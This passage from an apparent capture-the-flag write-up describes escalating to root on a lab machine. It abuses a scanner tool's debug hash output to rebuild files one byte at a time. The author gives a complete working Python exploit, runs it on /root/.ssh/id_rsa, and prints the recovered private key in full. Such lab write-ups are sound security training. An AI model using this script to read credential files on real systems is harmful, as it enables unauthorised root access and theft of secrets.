        This tool can also be used to check for duplicate images to avoid having multiple of the same photos in the gallery.
        File matching are evaluated by comparing an MD5 hash of the file contents or a portion of the file contents against those submitted in the hash file.

        The hash blacklist file should be maintained as a single LABEL:MD5 per line.
        Please avoid using extra colons in the label as that is not currently supported.

        Expected output:
        1. Empty if no matches found
        2. A line for every match, example:
                [+] {LABEL} matches {FILE}

  -c string
        Path to image file to check. Cannot be combined with -d
  -d string
        Path to image directory to check. Cannot be combined with -c
  -h string
        Path to colon separated hash file. Not compatible with -p
  -l int
        Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)
  -p    [Debug] Print calculated file hash. Only compatible with -c
  -s string
        Specific hash to check against. Not compatible with -h


```
It is able to MD5 hash files and compare them against a give list of hashes. It in fact does not work like it says it does, but the broken part is just the full file hash

It also has the ability to hash only the first X characters of a file. -p will be useful because it will print the calculated hash of the file or portion of the file.

So for example: 
```
greg@intentions:~$ /opt/scanner/scanner -c user.txt -p -l 5 -s whatever
[DEBUG] user.txt has hash 27334757be8cee7cc16219de94ded2a1
greg@intentions:~$ echo -n "11a99" | md5sum
27334757be8cee7cc16219de94ded2a1  -

-c user.txt - target user.txt

-p - print debug

-l 5 - only consider the first 5 characters

-s whatever - alert if the result matches “whatever”, which will never succeed, but that’s ok

```
The debug message prints the hash, which matches the MD5 of the first five characters of the file

If I can get the hash of the first byte of a file, then I can brute force all possible bytes and take their hashes and compare to get a match. Then I can do the same with the first two bytes, first three bytes, etc, until I have the full file.
```
#!/usr/bin/env python3

import hashlib
import subprocess
import sys


def get_hash(fn, n):
    """Get the target hash for n length characters of 
    filename fn"""
    proc = subprocess.run(f"/opt/scanner/scanner -c {fn} -s whatever -p -l {n}".split(),
                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    try:
        return proc.stdout.decode().strip().split()[-1]
    except IndexError:
        return None


def get_next_char(output, target):
    """Take the current output and figure out what the
    next character will be given the target hash"""
    for i in range(256):
        if target == hashlib.md5(output + chr(i).encode()).hexdigest():
            return chr(i).encode()


output = b""
fn = sys.argv[1]

while True:
    target = get_hash(fn, len(output) + 1)
    next_char = get_next_char(output, target)
    if next_char is None:
        break
    output += next_char
    print(next_char.decode(), end="")
```

Then `python3 exploit.py /root/.ssh/id_rsa`
```
greg@intentions:~$ python3 read_file.py /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Then ssh to root shell.
